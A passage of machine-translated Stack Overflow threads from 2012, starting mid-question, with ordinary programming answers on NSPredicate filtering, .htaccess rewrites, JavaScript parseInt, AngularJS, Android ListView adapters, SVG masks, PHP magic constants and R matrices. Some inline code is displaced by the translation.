分配数据源后，我需要能够通过`(NSString *)genre`. 我了解如何使用来过滤我的数组，但是当有 5-6 个不同的字符串可以检查`NSPredicate`时，我无法弄清楚如何有效地做到这一点。`genre`

用户能够“检查”多个流派，这些流派基本上应该根据选择的流派来切换曲目的显示。我正在考虑创建一个`NSUserDefaults *defaults`看起来像这样的字典：`["genre1" = YES, "genre2" = NO, "genre3" = YES ...]`.

如何设置`NSPredicate`使用流派字典过滤数据源，而不使用带有大量条件的巨大 if/switch 语句。

这是我在`NSPredicate`实现之前的代码：

```
- (void)assignDataSource
{
switch (dataSourceAssignment.intValue) {
    case 0:     dataSource = [NSMutableArray arrayWithArray:tracksArray];           break;
    case 1:     dataSource = [NSMutableArray arrayWithArray:favoriteTracks];        break;
    case 2:     dataSource = [NSMutableArray arrayWithArray:topTracksOfTheWeek];    break;
    case 3:     dataSource = [NSMutableArray arrayWithArray:topTracksOfTheMonth];   break;
    case 4:     dataSource = [NSMutableArray arrayWithArray:topTracksOfTheYear];    break;
    default:    break;
}

if (dataSourceAssignment.intValue >= 2)  {
    NSSortDescriptor *avgRatingSortDescriptor = [[NSSortDescriptor alloc] initWithKey:@"confidenceRating" ascending:NO];
    NSArray *sortDescriptors = [NSArray arrayWithObjects:avgRatingSortDescriptor, nil];
    NSArray *sortedArray = [dataSource sortedArrayUsingDescriptors:sortDescriptors];
    dataSource = [NSMutableArray arrayWithArray:sortedArray];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T00:42:17.400

当你使用 时`predicateWithFormat`，你可以传递一个关于谓词的正则表达式语句。该字符串是您可以执行多个谓词的地方，因此可以在选择不同类型时进行更改。

例如，您可以有：`predicateWithFormat:predicateString`，然后`predicateString`设置为类似于`"SELF beginswith genre1 AND SELF beginswith genre1"`如果用户选择了流派 1 和流派 2。虽然肯定会仔细检查我使用的正则表达式，但因为你需要比它更好的东西才能正常工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T06:34:23.903

您可以将选择的流派存储到数组中，然后使用谓词。当用户选择/取消选择元素时，您还可以删除/添加元素。

```
NSArray *selectedGenresByUser = [NSArray arrayWithObjects:@"genre1",@"genre2", nil];
NSPredicate *predicate = [NSPredicate predicateWithFormat: @"genre in $SELECTED_GENRES"];
predicate = [predicate predicateWithSubstitutionVariables:[NSDictionary dictionaryWithObject:[NSArray arrayWithArray:selectedGenresByUser] forKey:@"SELECTED_GENRES"]];
//then use predicate to filter datasource array( maby you can store all elements in one array) 
```

# .htaccess - Mod重写根本不起作用（phtml/php）

> ID：11786748
> 
> 赞同：1
> 
> 时间：2012-08-02T22:26:44.773
> 
> 标签：.htaccess, mod-rewrite, hosting, php

在我的网站上遇到 .htaccess 的一些问题。我正在尝试更改我网站的 URL 后缀。URL 当前显示为：

```
www.example.com/about.phtml 
```

我想删除 about.phtml 并用 about 替换它，所以它看起来像：

```
www.example.com/about 
```

我使用的示例不是我在网站上需要的，所以我想要代码，我不必通过并指定从哪个特定页面删除它，而是自动完成所有操作。

我试过使用 php 而不是 phtml 没有运气。这是我正在使用的代码：

```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}\.phtml -f
RewriteRule ^(.*)$ $1.phtml 
```

有什么想法我在这里做错了吗？

仅供参考：我的主机是 JustHost，他们允许我编辑我的 .htaccess，但如果有人听说过他们或对他们有任何问题，请告诉我，我与他们的技术支持人员交谈过，他们无法帮助我帮助自己。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T22:30:38.483

这对我有用：

```
RewriteEngine on
RewriteRule ^/?([a-z]+)$ $1.phtml [L] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:39:14.090

试试这个 ：

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ $1.phtml [NC,L] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T22:45:54.243

您可以先检查您的重写模式是否在 apache\conf\httpd.conf 文件中

检查 httpd.conf 文件中的以下代码

```
#LoadModule rewrite_module modules/mod_rewrite.so 
```

如果行上方存在哈希，则删除哈希并重新启动 apache 服务器

之后，您可以在 cakephp httaccess 文件中设置以下代码

```
<IfModule mod_rewrite.c>
    RewriteEngine on
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_FILENAME}\.phtml -f
    RewriteRule ^(.*)$ $1.phtml [NC,L]
</IfModule> 
```

# javascript - 为什么 parseInt('08') 给出 0，而 parseInt('07') 给出 7

> ID：11786758
> 
> 赞同：15
> 
> 时间：2012-08-02T22:28:56.273
> 
> 标签：javascript, parseint

> **可能重复：**
> [JavaScript parseInt 八进制错误的解决方法](https://stackoverflow.com/questions/850341/workarounds-for-javascript-parseint-octal-bug)

我正在研究 javascript，我似乎觉得这很奇怪，javascript 函数 parseInt('08') 返回 0 而 parseInt('07') 返回 7。

这种行为似乎存在于 Firefox 中。

parseInt('08') 在 IE 中返回 8，但在 Firefox 中返回 0 ..

为什么？我希望 parseInt('08') 按预期返回 8 并进入 IE。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-08-02T22:30:19.040

是的，我以前遇到过这个。这真的很奇怪，因为某些浏览器会将此解释为您希望以 8 为基数解析它。请考虑以下文章：

[http://www.breakpar.com/bkp/home.nsf/0/87256B280015193F87256C85006A6604](http://www.breakingpar.com/bkp/home.nsf/0/87256B280015193F87256C85006A6604)

基本上，您必须告诉解析器使用以 10 为底的数字：

```
parseInt('08', '10'); 
```

# angularjs - 跟踪以查看 angularjs 中的视图何时更改

> ID：11786764
> 
> 赞同：9
> 
> 时间：2012-08-02T22:29:45.627
> 
> 标签：angularjs

有谁知道当视图发生变化时如何使角度触发事件？或者在请求和下载视图时？我正在尝试为页面更改添加加载动画。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-02T23:04:46.577

看看[这个线程](https://groups.google.com/d/topic/angular/OroP1DBE6AA/discussion)，它看起来`$httpProvider.responseInterceptors`是添加这类东西的好地方。

[这个小提琴](http://jsfiddle.net/zdam/dBR2r/)展示了一个很好的例子，说明在哪里添加代码来启动/停止 ajax 请求的微调器。[这个小提琴](http://jsfiddle.net/dBR2r/8/)很相似，但实际上显示并隐藏了一个“正在加载...” div。

如果您只想在视图更改时显示一个微调器，您可以将您的开始/停止代码限制为`content-type`等于`text/html`类似于[这篇文章](https://groups.google.com/d/msg/angular/OroP1DBE6AA/YZ7BuhKI8eMJ)显示的内容`application/json`。

注意：在我的测试中，检索我的 .html 文件时似乎省略了`headersGetter()['Content-Type']`in ，`spinnerFunction`而在进行服务调用时填充了它。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-11-05T22:44:03.397

我认为更简单、适应性更强的方法是使用 AngularJS`$http.pendingRequests.length`调用。它返回待处理的 ajax 调用计数。所以当它到达时`0`，你的页面就完成了加载。

您可以创建一个指令，在任何元素上插入加载 div（稀松布），然后等待所有 ajax 调用解决，然后删除您的微调器。

这是制作 AngularJS 指令的代码的核心：

```
 // Prepend the loading div to the dom element that this directive is applied.
        var scrim = $('<div id="loading"></div>');
        $(scrim).prependTo(domElement);

        /**
         * returns the number of active ajax requests (angular + jquery)
         * $.active returns the count of jQuery specific unresolved ajax calls. It becomes 0 if
         * there are no calls to be made or when calls become finished.
         * @return number of active requests.
         */
        function totalActiveAjaxRequests() {
            return ($http.pendingRequests.length + $.active);
        }

        /**
         * Check for completion of pending Ajax requests. When they're done,
         * remove the loading screen and show the page data.
         */
        scope.$watch(totalActiveAjaxRequests, function whenActiveAjaxRequestsChange() {
            if(totalActiveAjaxRequests() === 0){
                $log.log("done loading ajax requests");
                $(scrim).remove();
                $(domElement).css("position", "inherit");
            }
        }); 
```

请注意，$.active 是无证的。

# java - ListView 在 Android 中可以有两种或多种不同类型的行布局吗？

> ID：11786765
> 
> 赞同：3
> 
> 时间：2012-08-02T22:29:55.680
> 
> 标签：java, android, eclipse, android-listview

我现在在 ListActivity 中有一个非常简单的 ListView，它只显示一个文本值列表。这是我当前的代码：

```
public class InfoActivity extends ListActivity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        List<String> values = new ArrayList<String>();
        // loads up the values array here
        // ...

        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, values);
        setListAdapter(adapter);
    } 
```

InfoActivity 的 XML 文件中没有任何内容，因为我使用的是 ListActivity。

我想做的是为行制作自定义布局。前 5 行包含 layoutA.xml，后 5 行包含 layoutB.xml。

我该怎么做呢？我不知道从哪里开始。显然，我正在寻找最简单的代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T23:04:47.150

这是一篇很棒的博客文章，关于为您的列表项设置不同的布局。

[处理具有多行类型的列表视图](http://logc.at/2011/10/10/handling-listviews-with-multiple-row-types/)

还有示例项目，因此您可以配置和尝试示例。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T23:05:09.187

这很容易，您只需要扩展 ArrayAdapter。我的 ArrayAdapter 做两件事不同：

*   我的适配器没有传递一个 ResourceId，而是采用一组 ResourceId
*   getView() 检查位置并加载适当的资源

这是一个简单的例子。如果您打算让它比前半部分看起来更复杂，而后半部分则不同，那么您应该覆盖[getViewTypeCount()](http://developer.android.com/reference/android/widget/BaseAdapter.html#getViewTypeCount%28%29)和[getItemViewType()](http://developer.android.com/reference/android/widget/BaseAdapter.html#getItemViewType%28int%29)。

工作示例：

```
public class Example extends Activity {
    public class MyArrayAdapter<T> extends ArrayAdapter<T> {
        LayoutInflater mInflater;
        int[] mLayoutResourceIds;

        public MyArrayAdapter(Context context, int[] textViewResourceId, List<T> objects) {
            super(context, textViewResourceId[0], objects);
            mInflater = (LayoutInflater)context.getSystemService (Context.LAYOUT_INFLATER_SERVICE);
            mLayoutResourceIds = textViewResourceId;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            if (convertView == null && position > 2)
                convertView = mInflater.inflate(mLayoutResourceIds[1], parent, false);
            return super.getView(position, convertView, parent);
        }
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String[] array = new String[] {"one", "two", "three", "four", "five", "six"};
        List<String> list = new ArrayList<String>();
        Collections.addAll(list, array);

        ListView listView = new ListView(this);
        listView.setAdapter(new MyArrayAdapter<String>(this, new int[] {android.R.layout.simple_list_item_1, android.R.layout.simple_list_item_single_choice}, list));
        setContentView(listView);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:34:57.723

我相信如果你有一个计数器，比如说从 0 开始，然后用 充气并重用前五个，然后当它在 5 时，用`layoutA.xml`废弃充气。这应该很简单。当然，我是通过 谈论这个，它允许您制作一个 Adapter 来设置. 我从来没有真正使用过. 但过程应该是一样的。`layoutA.xml``layoutB.xml``BaseAdapter``ListView``ListActivity`

只是添加@lxx 发布的内容，我的意思是链接，它绝对可以帮助您弄清楚如何完成您想要的。虽然我会说，当你想要 5 个一种和 5 个另一种时，使用这些方法有点矫枉过正。绝对将该链接用作良好的基线，但只需使用计数器。它更简单。在内存方面，只有当您知道计数器已经放入 5 个视图时才重新填充布局。这样你就不会每次都这样做。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T23:07:32.020

您可以尝试使用 MergeAdapter (cwac-merge)，在一个 ListView 中，您可以拥有多个具有不同布局的适配器。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-06-30T05:41:57.060

如果我们需要在列表视图中显示不同类型的视图，那么最好在适配器中使用 getViewTypeCount() 和 getItemViewType() 而不是切换视图 VIEW.GONE 和 VIEW.VISIBLE 在 getView() 中可能是非常昂贵的任务，这将影响列表滚动。

请检查这一点以了解适配器中 getViewTypeCount() 和 getItemViewType() 的使用。

链接： [getviewtypecount 的使用](http://kyogs.blogspot.in/2014/06/the-use-of-getviewtypecount-and.html)

# html - 如何将具有 collada 交互性的 swf 文件插入到 html 页面中？

> ID：11786766
> 
> 赞同：0
> 
> 时间：2012-08-02T22:29:57.677
> 
> 标签：html, flash, collada

我有一个需要嵌入网页的 swf 文件。safari 和 google chrome 是否支持带有 collada 的 swf 文件？

# javascript - 用 2 点之间的间隙填充

> ID：11786768
> 
> 赞同：5
> 
> 时间：2012-08-02T22:30:23.717
> 
> 标签：javascript, html

我今天做了一个实验，看看我能用`<div>`s 做什么。所以我做[了一个简单的Paint-like程序](http://derek1906.site50.net/file/html_canvas.html)，你可以用`<div>`s来画。

```
$(window).mousemove(function(e){
    if(!mousedown){
        return false;
    }
    var x = e.clientX,
        y = e.clientY;

    drawDot(x,y,ele);

    lastX = x;
    lastY = y;          
}); 
```

这是代码的一部分。它有效，但点之间存在间隙。所以我创建了一个名为的函数`fillDot`，它将从 A 点（最后一点）到 B 点（当前点）画一条线。

```
drawDot(x,y,ele);

fillDot(lastX,lastY,x,y,ele); 
```

```
function fillDot(lx,ly,x,y,canvas){
    var rise = y - ly,
        run = x - lx,
        slope = rise / run,
        yInt = y - (slope * x);
    if( lx < x ){
        for(var i = lx; i < x ; i+=.5){
            var y = slope * i + yInt;
            drawDot(i,y,canvas);
        }
    }else if( x < lx ){
        for(var i = x; i < lx ; i++){
            var y = slope * i + yInt;
            drawDot(i,y,canvas);
        }
    }
} 
```

只有当我绘制水平线时它才能正常工作。当我从上到下或从下到上绘制时，仍然会有间隙。我发现了一种叫做[Bresenham 的线算法](http://en.wikipedia.org/wiki/Bresenham%27s_line_algorithm)的东西，它可以做同样的事情，但我不知道如何使用它......

知道如何填充两者之间的所有点吗？

ps：我知道有`<canvas>`，但我正在测试我能用它做什么`<div>`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T01:46:04.593

没关系，我将 Bresenham 的线算法翻译成 JavaScript，它现在可以完美运行了！

```
function fillDot(x0, y0, x1, y1){
   var dx = Math.abs(x1-x0);
   var dy = Math.abs(y1-y0);
   var sx = (x0 < x1) ? 1 : -1;
   var sy = (y0 < y1) ? 1 : -1;
   var err = dx-dy;

   while(true){

     drawDot(x0,y0);

     if ((x0==x1) && (y0==y1)) break;
     var e2 = 2*err;
     if (e2>-dy){
       err -= dy;
       x0  += sx;
     }
     if (e2 < dx){
       err += dx;
       y0  += sy;
     }
   }
} 
```

# c# - jQuery自动完成插件上有多个列和结果？

> ID：11786775
> 
> 赞同：1
> 
> 时间：2012-08-02T22:31:39.877
> 
> 标签：c#, jquery, html, visual-studio-2008, autocomplete

我正在使用 jQuery 自动完成插件。不是 jQueryUI 自动完成。我似乎找不到关于 jQuery 自动完成的任何好的说明。

有谁知道如何获得多个搜索参数和结果。
IE。用户可以搜索 ID、FNAME、LNAME 并自动完成相应地显示结果？

所以搜索 JON 自动完成返回 JON DOE N41, JONATHAN MILLER Q66

或者

搜索 Q6 自动完成返回 JONATHAN MILLER Q66、MIKE CAMPBELL Q67 等

这是我当前的代码。

ashx 处理程序：

```
public class Search_CS : IHttpHandler {

    public void ProcessRequest (HttpContext context) {
        string prefixText = context.Request.QueryString["q"];
        using (SqlConnection conn = new SqlConnection())
        {
            conn.ConnectionString = ConfigurationManager
                    .ConnectionStrings["Rollup2ConnectionString"].ConnectionString;
            using (SqlCommand cmd = new SqlCommand())
            {
                cmd.CommandText = "select NUID from T_USER where " +
                "NUID like @SearchText + '%'";
                cmd.Parameters.AddWithValue("@SearchText", prefixText);
                cmd.Connection = conn;
                StringBuilder sb = new StringBuilder(); 
                conn.Open();
                using (SqlDataReader sdr = cmd.ExecuteReader())
                {
                    while (sdr.Read())
                    {
                        sb.Append(sdr["NUID"])
                            .Append(Environment.NewLine);
                    }
                }
                conn.Close();
                context.Response.Write(sb.ToString()); 
            }
        }
    }

    public bool IsReusable {
        get {
            return false;
        }
    }
} 
```

这是我的 HTML：

```
<script src="Scripts/jquery.autocomplete.js" type="text/javascript"></script>
<link href="Autocomplete/jquery.autocomplete.css" rel="stylesheet" type="text/css" />  

<script type="text/javascript">
    $(document).ready(function() {
        $("#<%=txtSearch.ClientID%>").autocomplete('Autocomplete/Search_CS.ashx', {width: 400, multiple: true, matchContains: true });
    });

</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:49:30.290

它与您的 SQL 查询有关。您需要定位数据库中的这些列并像 NUID 一样搜索所有这些列。

```
cmd.CommandText = "select NUID, FNAME, LNAME from T_USER where NUID like @SearchText + '%' OR FNAME like @SearchText + '%' OR LNAME like @SearchText + '%'"; 
```

# iis - IIS7 404 执行 URL 根本不起作用

> ID：11786776
> 
> 赞同：1
> 
> 时间：2012-08-02T22:31:48.123
> 
> 标签：iis, iis-7, iis-7.5, http-status-code-404

我正在运行带有 IIS 7.5 和 Adob​​e ColdFusion 10 的 Windows Server 2008 R2。我已经建立了一个新网站，它运行正常。我尝试通过选择新网站并转到错误页面面板来设置自定义 404 页面。我修改了 404 状态码以执行本地页面。然后我进入功能设置并告诉它报告本地请求的详细信息，远程请求的自定义。但是，IIS 总是返回默认的远程 404 页面。

我的 web.config 文件非常简单。/Video/404.cfm 文件存在并正确执行。

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <httpErrors>
            <remove statusCode="404" subStatusCode="-1" />
            <error statusCode="404" prefixLanguageFilePath="" path="/Video/404.cfm" responseMode="ExecuteURL" />
        </httpErrors>
    </system.webServer>
</configuration> 
```

所以我一定在这里遗漏了一些东西......为什么自定义 404 页面在这里不起作用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-14T15:00:01.893

我认为这是 Server 2008 R2 和 CF10 中的错误。[我在这里](https://bugbase.adobe.com/index.cfm?event=bug&id=3364745)发布了一个错误报告。

# php - .htaccess 重写/重定向模块或 PHP 脚本

> ID：11786780
> 
> 赞同：1
> 
> 时间：2012-08-02T22:32:29.667
> 
> 标签：php, .htaccess, url, redirect, rewrite

因此，目前我工作的电子商务公司正在从基于 .NET 的平台过渡到基于 Magento PHP 的站点。我遇到的问题是，我们目前有 1000 个着陆页在搜索引擎上排名很高。我无法在新平台 - Magento 中对所有这些页面进行 301 处理，而且我知道由于性能问题，我无法将 1000 个静态重定向添加到 .htaccess 文件中。

所以我的问题是，有没有办法为我们的数据库中生成索引页面 URL 的变量创建重写或重定向规则。如果有，在性能方面，仅使用 .htaccess 文件、仅使用 PHP 脚本或两者结合会更聪明吗？

这是我们当前 URL 之一的示例以及我们希望将其重定向到的示例：

当前网址 /Clear_For_Life-Aquariums_Bowls-AT-70_180-AQAQ-ct.html

以下是我们用于生成重写的数据的细分；

1.  /Clear_For_Life = 数据库中的供应商名称列
2.  Aquariums_Bowls = DB 中的子类别列
3.  AT = DB 中的 VendorCode 列
4.  70_180 = 数据库中的 PriceRange 列
5.  AQAQ = 数据库中的 CategoryId 列

需要重定向到的 URL；/clear-for-life-aquariums-bowl

任何帮助或建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:49:25.423

我不相信您可以使用 mod rewrite 更改大小写或替换字符（'_' 到 '-'）。

为什么你不能对所有这些页面进行 301 处理？如果它们是通过 .NET 访问的，那么无论您在哪里进行路由/解析 url，都应该有一行代码来执行 php 重定向。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:54:38.860

我说使用 htaccess，并编写一个简单的实用程序从 301 详细信息列表中生成所述 htaccess 文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T23:53:19.430

> 所以我的问题是，有没有办法为我们的数据库中生成索引页面 URL 的变量创建重写或重定向规则。如果有，在性能方面，仅使用 .htaccess 文件、仅使用 PHP 脚本或两者结合会更聪明吗？

这听起来像是[RewriteMap](http://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritemap)的工作。您需要访问服务器或虚拟主机配置并创建地图。您可以使用此映射来调用可以从数据库中获取某些内容的脚本，然后决定新 URI 的外观。最简单的用法`RewriteMap`可能是：

```
RewriteMap remap prg:/path/to/script 
```

稍后您可以简单地执行以下操作：

```
RewriteRule ^(.*)$ /${remap:$1|$1} [L] 
```

`/path/to/script`需要接受输入`Clear_For_Life-Aquariums_Bowls-AT-70_180-AQAQ-ct.html`，解析它，然后正确输出`clear-for-life-aquariums-bowl`。

# html - SVG：掩盖一个图案

> ID：11786785
> 
> 赞同：2
> 
> 时间：2012-08-02T22:33:10.220
> 
> 标签：html, svg

尝试在填充颜色的圆圈顶部获得类似细条纹的效果，以便图案在圆圈顶部被遮盖。我不太确定我做错了什么，但我的代码似乎接近正确的。

```
 <?xml version="1.0" standalone="no"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="200" width="200">
    <defs>
      <pattern id="stripe" patternUnits="userSpaceOnUse" x="0" y="0" width="10" height="10">
        <g >
          <line x1="10" y1="0" x2="0" y2="10" />
        </g>
      </pattern>
      <mask id="mask" maskUnits="objectBoundingBox" maskContentUnits="ObjectBoundingBox">
        <rect height="300" width="300" style="fill: url(#pinstripe);" />
      </mask>
      <style>
        g {
          mask: url(#mask);
          stroke: black;
          stroke-width: 1px;
          stroke-linecap: butt;
          stroke-rendering: crispEdges;
        }
        circle {
          fill: green;
        }
      </style>
    </defs>
    <g>
      <circle cx="100" cy="100" r="100" />
    </g>
  </svg> 
```

您可以查看[此小提琴](http://jsfiddle.net/ffGK3/)以有效地看不到任何东西-实际查看圆圈，删除`mask: url(#mask);`样式。

所以我不太确定出了什么问题 - 我只是想有一个绿色填充和顶部白色条纹的圆圈。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:54:54.130

我认为你需要修复你的“白色”和“黑色”颜色，因为这就是面具中使用的颜色。

这是一个有效的示例（您的代码）。尝试在“填充”和“描边”属性中切换“白色”和“黑色”颜色。

**这是我的第一个“rect”示例：**

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="200" width="200">
  <defs>
    <pattern id="pinstripe" patternUnits="userSpaceOnUse" x="0" y="0" width="10" height="10">
     <rect x="0" y="0" width="10" height="10" stroke="black" stroke-width="1" fill="white" />
  </pattern>
    <mask id="mask" maskUnits="objectBoundingBox" maskContentUnits="ObjectBoundingBox">
      <rect x="0.5" y="0.2" height="300" width="300" style="fill: url(#pinstripe)" />
    </mask>
    <style>
      g {
        mask: url(#mask);
        stroke: black;
        stroke-width: 1px;
        stroke-linecap: butt;
        stroke-rendering: crispEdges;
      }
      circle {
        fill: green;
      }
    </style>
  </defs>
  <g>
    <circle cx="100" cy="100" r="100" />
  </g>
</svg> 
```

**编辑：**

**这是另一个使用线条的版本（请注意，我将填充和描边设置为“#ffffff”或“白色”来制作此蒙版：** ​</p>

```
<?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
    "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="200" width="200">
      <defs>
        <pattern id="pinstripe" patternUnits="userSpaceOnUse" x="0" y="0" width="10" height="10">

            <line x1="10" y1="0" x2="0" y2="10" fill="#ffffff" stroke="#ffffff" />
      </pattern>
        <mask id="mask" maskUnits="objectBoundingBox" maskContentUnits="ObjectBoundingBox">
          <rect x="0.5" y="0.2" height="300" width="300" style="fill: url(#pinstripe)" />
        </mask>
        <style>
          g {
            mask: url(#mask);
            stroke: black;
            stroke-width: 1px;
            stroke-linecap: butt;
            stroke-rendering: crispEdges;
          }
          circle {
            fill: green;
          }
        </style>
      </defs>
      <g>
        <circle cx="100" cy="100" r="100" />
      </g>
    </svg>​ 
```

# php - 找到我所在的方法的名称

> ID：11786788
> 
> 赞同：0
> 
> 时间：2012-08-02T22:33:35.553
> 
> 标签：php, methods

> **可能重复：**
> [获取当前类和方法？](https://stackoverflow.com/questions/2140282/get-current-class-and-method)

如何找到我在 php 中使用的方法的名称？我发现了如何在 C 中做到这一点，但在 PHP 中没有。我在这里找到了一个 Q ，它粗略地谈论了魔法常数（[在这里](https://stackoverflow.com/questions/2140282/get-current-class-and-method)），但我并没有真正理解。在以下示例中，我希望 $thisMethodName 为 'model_databaseLogin'

例如：

```
public function model_databaseLogin()
{
$thisMethodName = ... ;
return $this->model_methodCheck( $thisMethodName );
} 
```

这在php中可能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:37:04.093

你需要“魔法常数” `__METHOD__`。魔术[常量文档](http://www.php.net/manual/en/language.constants.predefined.php)应该会有所帮助。

所以你的代码是：

```
public function model_databaseLogin() {
    $thisMethodName = __METHOD__;
    return $this->model_methodCheck($thisMethodName);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:39:21.597

最简单的答案是您所指的魔术常数；具体来说`__FUNCTION__`

这些被称为“魔术”，因为它们的价值实际上是上下文动态的。

```
public function model_databaseLogin()
{
$thisMethodName = __FUNCTION__;
return $this->model_methodCheck( $thisMethodName );
} 
```

还有另一种方法，通过 debug_backtrace()，但这显然效率较低！

# r - 创建一个三角矩阵

> ID：11786795
> 
> 赞同：14
> 
> 时间：2012-08-02T22:34:19.553
> 
> 标签：r, matrix

必须有一种优雅的方式来做到这一点，但我无法弄清楚：

列是从 1 到 0 的概率

行是从 0 到 1 下降的概率

这个 kludgy 代码产生了想要的结果（但我想用比这更大的矩阵来做）：

```
# Vector entries are rowname - colname, if >= 0
#
rb0 <-  c(NA,NA,NA,NA,NA,NA,NA,NA,NA,NA, 0)
rb1 <-  c(NA,NA,NA,NA,NA,NA,NA,NA,NA, 0,.1)
rb2 <-  c(NA,NA,NA,NA,NA,NA,NA,NA, 0,.1,.2)
rb3 <-  c(NA,NA,NA,NA,NA,NA,NA, 0,.1,.2,.3)
rb4 <-  c(NA,NA,NA,NA,NA,NA, 0,.1,.2,.3,.4)
rb5 <-  c(NA,NA,NA,NA,NA, 0,.1,.2,.3,.4,.5)
rb6 <-  c(NA,NA,NA,NA, 0,.1,.2,.3,.4,.5,.6)
rb7 <-  c(NA,NA,NA, 0,.1,.2,.3,.4,.5,.6,.7)
rb8 <-  c(NA,NA, 0,.1,.2,.3,.4,.5,.6,.7,.8)
rb9 <-  c(NA, 0,.1,.2,.3,.4,.5,.6,.7,.8,.9)
rb10 <- c( 0,.1,.2,.3,.4,.5,.6,.7,.8,.9,1 )
indbias <- rbind(rb0,rb1,rb2,rb3,rb4,rb5,rb6,rb7,rb8,rb9,rb10)
colnames(indbias) <- seq(1,0,by=-.1)
rownames(indbias) <- seq(0,1,by=.1)
indbias 
```

谢谢！

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-02T23:59:54.687

```
 mat <- matrix(NA, 10,10)
 mat[row(mat)+col(mat) >=11] <- (row(mat)+col(mat) -11)[row(mat)+col(mat)>=11]/10
 mat
      [,1] [,2] [,3] [,4] [,5] [,6] [,7] [,8] [,9] [,10]
 [1,]   NA   NA   NA   NA   NA   NA   NA   NA   NA   0.0
 [2,]   NA   NA   NA   NA   NA   NA   NA   NA  0.0   0.1
 [3,]   NA   NA   NA   NA   NA   NA   NA  0.0  0.1   0.2
 [4,]   NA   NA   NA   NA   NA   NA  0.0  0.1  0.2   0.3
 [5,]   NA   NA   NA   NA   NA  0.0  0.1  0.2  0.3   0.4
 [6,]   NA   NA   NA   NA  0.0  0.1  0.2  0.3  0.4   0.5
 [7,]   NA   NA   NA  0.0  0.1  0.2  0.3  0.4  0.5   0.6
 [8,]   NA   NA  0.0  0.1  0.2  0.3  0.4  0.5  0.6   0.7
 [9,]   NA  0.0  0.1  0.2  0.3  0.4  0.5  0.6  0.7   0.8
[10,]    0  0.1  0.2  0.3  0.4  0.5  0.6  0.7  0.8   0.9 
```

我认为这将比 plyr 解决方案快得多，而且我碰巧认为它更容易理解。它基本上为右下角“三角形”中的条目设置了一个测试，然后将该“测试”矩阵的结果除以 10。您可以使用以下代码查看测试矩阵：

```
row(mat)+col(mat) -11 
```

编辑：我认为有可能将矩阵制作一次，如 sebastian-c 所示，然后进行一次测试来进行 NA 设置可能会更快（调用次数为`row`and的三分之一`col`），但它似乎只有三分之一快速地。看起来两个 seq 调用比 extra 花费更多时间：

```
mat <- round(outer(seq(-0.5, 0.5, 0.1), seq(-0.5, 0.5, 0.1), `+`), 1)
is.na(mat) <- row(mat)+col(mat) <= 11
mat 
```

我确实找到了基于鲜为人知的`embed`功能的另一种解决方案：

```
mat <- embed(seq(-1,1, by=0.1), 11 )[,11:1]
is.na(mat) <- row(mat)+col(mat) <= 11 
```

虽然它比新解决方案快 50%，但仍然比原来的慢。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-08-03T01:40:36.233

稍微不同的解决方案，风格接近@DWin：

使用适当的下三角形创建一个矩阵（我认为舍入不是绝对必要的，但否则浮点错误会使它看起来很糟糕）：

```
mat <- round(outer(seq(-0.5, 0.5, 0.1), seq(-0.5, 0.5, 0.1), `+`), 1)
mat

      [,1] [,2] [,3] [,4] [,5] [,6] [,7] [,8] [,9] [,10] [,11]
 [1,] -1.0 -0.9 -0.8 -0.7 -0.6 -0.5 -0.4 -0.3 -0.2  -0.1   0.0
 [2,] -0.9 -0.8 -0.7 -0.6 -0.5 -0.4 -0.3 -0.2 -0.1   0.0   0.1
